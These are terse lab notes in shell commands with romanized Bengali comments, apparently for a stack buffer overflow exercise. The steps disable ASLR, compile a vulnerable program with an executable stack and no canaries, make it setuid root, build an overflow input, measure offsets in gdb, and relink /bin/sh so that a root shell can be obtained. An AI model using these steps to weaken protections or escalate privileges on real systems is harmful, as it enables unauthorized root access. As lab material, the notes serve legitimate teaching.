sysctl -a --pattern 'randomize'

sudo sysctl -w kernel.randomize_va_space=0 #ASLR - randomization off rakhe. 2 = fully random, 1 = partially random. amader '0' lagbe

 gcc -fPIE -pie -o testAddress.out testAddr.c  #code er return address barbar change hobe. 

#############################
 gcc -z execstack -fno-stack-protector -o stack buffer_overflow.c

 # execstack ----> makes stack executable. so that we can execute codes in the stack. 
 # -fno-stack-protector ----> stack protector means the 'canary values'. ei canary value thakle attack deya jabe na. so, canary value 'no' kore dite hobe. '-fno' mane 'no'.

 sudo chown root stack
 sudo chmod 4755 stack

 python -c 'print("A" * 99)'  > badfile

 ./stack # ekhn segmentation fault khabe. 

 #######################

 gcc -g -z execstack -fno-stack-protector -o gdb_stack buffer_overflow.c

 gdb --nx gdb_stack

#gdb te - 
b foo
run 

p $ebp
p &buffer

p/d 0xbfffeb48 - 0xbfffeadc


################


exploit.py
./stack

###############
ls -l /bin | grep 'sh'
sudo ln -sf /bin/zsh /bin/sh

##########